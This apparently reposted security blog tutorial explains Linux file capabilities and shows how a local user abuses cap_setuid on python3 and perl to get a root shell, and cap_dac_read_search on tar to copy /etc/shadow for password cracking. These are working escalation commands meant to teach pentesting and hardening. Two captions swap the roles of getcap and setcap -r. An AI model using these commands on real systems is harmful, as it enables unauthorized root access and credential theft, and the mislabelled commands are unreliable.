---
title: 'Linux Privilege Escalation using Capabilities'
date: 2019-11-30T10:02:00+01:00
draft: false
---

In this article, we will discuss the mechanism of **“capability”** and Privilege escalation by abusing it. As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task.

This functionality mainly can be achieved by assigning privileges through [sudo](https://en.wikipedia.org/wiki/Sudo), or [setuid](https://en.wikipedia.org/wiki/Setuid) permissions to an executable file which allows the user to adopt the role of the file owner.

To accomplish the same task in a more secure way the system admin uses “capability” which plays an effective role in the security of Linux based operating systems.

### **Table of Content**

**Introduction to Capability**

*   What is capability?
*   Difference between capability and SUID.
*   Use of capabilities.
*   Working with capability
*   List of capability

**Abusing capability for Privilege Escalations**

*   Python3
*   Perl
*   Tar

### **Introduction to Capability**

**What is capability in Linux**

Before capabilities, we only had the binary system of privileged and non-privileged processes and for the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes that referred as superuser or root and unprivileged processes (whose effective UID is nonzero).

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

**Difference between capability and SUID**

**SUID:** SUID stands for set user ID and allows users to execute the file as the file owner. This is defined as giving temporary access to a user to run a program/file with the permissions of the file’s owner rather than the user who runs it. This can easily be detected by the use of the “Find” command. To find all files with SUID set in the current directory we can use-perm option which will print files only with permissions set to 4000.

![](https://i2.wp.com/1.bp.blogspot.com/-QeaikXSH6Bs/XeIpTvBdsqI/AAAAAAAAhto/WInrLFLAlBghsgaJ3-X2SSbMbgzatRArwCLcBGAsYHQ/s1600/0.1.png?w=687&ssl=1)

**Capability:** Security of Linux systems can be improved by using many actions. One of these measures is called **Linux capabilities** which are maintained by the kernel. In other words, we can say that they are a little unintelligible but similar in principle to SUID. Linux’s thread privilege checking is based on capabilities.

![](https://i0.wp.com/1.bp.blogspot.com/-DFmmOWsjteA/XeIpT6xsU0I/AAAAAAAAhtw/Ayg6v6ZWCJcU-bRo8so63sKg20gEa11IQCLcBGAsYHQ/s1600/0.png?w=687&ssl=1)

**Uses of capabilities**

Capabilities work by breaking the actions normally reserved for root down into smaller portions. The use of capabilities is only beginning to drop into userland applications as most system utilities do not shed their root privileges. Let’s move ahead that how we can use this permission more into our task.

**Limited user’s permission:** As we know Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. So to overcome this situation we can simply use the capability to limited user’s permission.

**Using a fine-grained set of privileges:** Use of capability can be more clearly understood by another example. Suppose a web server normally runs at port 80 and we also know that we need root permissions to start listening on one of the lower ports (<1024). This web server daemon needs to be able to listen to port 80. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP\_NET\_BIND\_SERVICE. With this specific capability, it can open up port 80 in a much easier way.

**Working with capability**

The operation of capabilities can be achieved in many ways. Some of them are listed below:

**Assigning and removing capability**: They are usually set on executable files and are automatically granted to the process when a file with a capability is executed. The file capability sets are stored in an extended attribute named as security.capability. This can be done by the use of attribute CAP\_SETCAP capability.

To enable the capability for any file frame command as shown below:

```
setcap cap\_setuid+ep /home/demo/python3
```

Similarly one can also remove file capability by as below mentioned command.

```
getcap -r / 2>/dev/null
```

![](https://i0.wp.com/1.bp.blogspot.com/--8-saZqsJUg/XeIpUtDmjSI/AAAAAAAAht0/a0fwwuZtz6M858G2L4hdtqDSroUrWUdCgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

**Reading capability:** There are many files or program to which capability is predefined so to view that a file has any capability set then you can simply run the command as:

```
setcap -r /home/demo/python3
```

If you’d like to find out which capabilities are already set on your system, you can search your whole file-system recursively with the following command:

```
getcap -r / 2>/dev/null
```

![](https://i0.wp.com/1.bp.blogspot.com/-ZEpLdVo1unQ/XeIpVEop_nI/AAAAAAAAht4/P7LY6p2JIrYVgV1um23_okYBDgQDHfluwCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

**List of Capability**

On the basis of functionality, the capability is categorized into total 36 in the count. Some of the majorly used are shown below.

![](https://i1.wp.com/1.bp.blogspot.com/-b2lP_MwsxDs/XeIpVZoQULI/AAAAAAAAht8/8k2iTTw5eZwb8QQnaU8NF23ODrv1dwUsACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

### **Abusing Capabilities** **Privilege Escalations**

**Python Capability**

Suppose the system administrator wants to grant superuser permission for any binary program, let’s say for python3, which should only be available to a specific user, and admin doesn’t want to give SUID or sudo permission. The admin supposed to used capabilities, for the python3 program that should be executed by specific user let’s say for user “demo”. This can be accomplished with following commands on the host machine.

```
which python3  
cp /usr/bin/python3 /home/demo/  
setcap cap\_setuid+ep /home/demo/python3
```

As a result, the user demo received the privilege to run the python3 program as root because here admin has upraised the privilege by using cap\_setuid+ep which means all privilege is assigned to the user for that program. But if you will try to find 4000 permission files or programs then it might not be shown for /home/dome/python3.

**_Note:_** _the user home directory should be not accessible for other users because if it is accessed to other non-root users then other users will also proficient to take the privilege of capabilities set for user demo._

![](https://i1.wp.com/1.bp.blogspot.com/-_NY5PVXGp98/XeIpVhInt1I/AAAAAAAAhuA/zv3csezeN-YLPTlqcoU_9jI98LKPTjaAQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

**Exploiting capability using python3**

Assuming an intruder has compromised the host machine as local user and spawn the least privilege shell and he looked for system capabilities and found empty capability (ep) over suid is given python3 for user demo that means all privilege is assigned to user for that program, therefore taking advantage of this permission he can escalate into high privilege from low privilege shell.

```
getcap -r / 2>/dev/null  
pwd  
ls -al python3  
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash ")'  
id
```

Hence you can observe the local user demo has accessed the root shell as shown in the given image.

![](https://i0.wp.com/1.bp.blogspot.com/-KJSuOanH3hs/XeIpWCf4PEI/AAAAAAAAhuE/CF8cYc7dVModbfoIf713i_j6OrMYF9KcACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

**Perl Capability**

We have another example “perl” which is same as above where the admin supposed to used capabilities, for the perl program that should be executed by specific user let’s say for user “demo”. This can be accomplished with following commands on the host machine.

```
which perl  
cp /usr/bin/perl /home/demo/  
setcap cap\_setuid+ep /home/demo/perl
```

As a result, the user demo received the privilege to run the python3 program as root because here admin has upraised the privilege by using cap\_setuid+ep which means all privilege is assigned to the user for that program.

![](https://i2.wp.com/1.bp.blogspot.com/-PiPUhnAFgOQ/XeIpWVyQL1I/AAAAAAAAhuI/Eysz7iYu4wU1f09qvyHPK1Los7UQ3ifNgCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

**Exploiting capability using perl**

Repeat above step for exploit perl program to escalate the root privilege:

```
getcap -r / 2>/dev/null  
pwd  
ls -al perl  
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'  
id
```

![](https://i0.wp.com/1.bp.blogspot.com/-e7Jo3nTW2Ts/XeIpWdCv7wI/AAAAAAAAhuM/PH_uLypq918rSbm47oYAbFXtVleS0B1hwCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

**Tar Capability**

We have another example “tar” which is same as above where the admin supposed to used capabilities to extract high privilege file that are restricted for other users, that should be extracted by specific user let’s say by user “demo”.

Let’s take an example: The admin wants to assign a role, where the user “demo” can take the backup of files as root, for this task the admin has set read capability on tar program. This can be accomplished with following commands on the host machine.

```
which tar  
cp /bin/tar /home/demo/  
setcap cap\_dac\_read\_search+ep /home/demo/tar
```

![](https://i0.wp.com/1.bp.blogspot.com/-WRI1ndyugDw/XeIpWpWhMLI/AAAAAAAAhuQ/9MDAJYhZ6NgHIUb__kWJ1QnYHdlUqPjCgCLcBGAsYHQ/s1600/9.1.png?w=687&ssl=1)

**Exploiting capability using tar**

Repeat same procedure to escalate the privilege, take the access of host machine as a local user and move ahead for privilege escalation. Since this time admin has use CAP\_DAC\_READ\_SEARCH that will help us to bypass file read permission checks and directory read and execute permission checks.

```
getcap -r / 2>/dev/null  
pwd  
ls -al tar
```

In this, we try to read shadow file where all system’s user password hashes are stored for this you have to follow below steps.

*   Compress the /etc/shadow in the current directory with the help of the tar program.
*   You will get shadow.tar in your current directory.
*   Extract the shadow.tar and you will get a directory as “etc/shadow”.
*   Use cat/head/tail or program to read the hashes of passwords.

```
./tar cvf shadow.tar /etc/shadow  
ls  
./tar -xvf shadow.tar
```

![](https://i0.wp.com/1.bp.blogspot.com/-b3644p0Bs_w/XeIpXefPKcI/AAAAAAAAhuU/BmIyU1zimQ4tqVwsbMEzgVn3HLetXA9zQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

As a result, you will have “etc/shadow” file your current directory and you can read the hashes of the password as shown here.

```
tail -8 etc/shadow
```

A malicious user can break this password using a tool such as a john the ripper or hash killer etc.

![](https://i2.wp.com/1.bp.blogspot.com/-yn41un2uWV8/XeIpTyqOImI/AAAAAAAAhts/TyqIpU2fKYoxJoG7h7mdSabts9sffP2qwCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

**Conclusion**:  The system admin should be aware of security loopholes during assigning such capability which can affect the integrity of kernel that can lead to privilege escalation.

**References**:

[http://lists.linuxfromscratch.org/pipermail/hlfs-dev/2011-August/004870.html](http://lists.linuxfromscratch.org/pipermail/hlfs-dev/2011-August/004870.html)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

**Author**: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact [**Here**](https://www.linkedin.com/in/komal-rajput-26b783131/)

The post [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2XZM7FE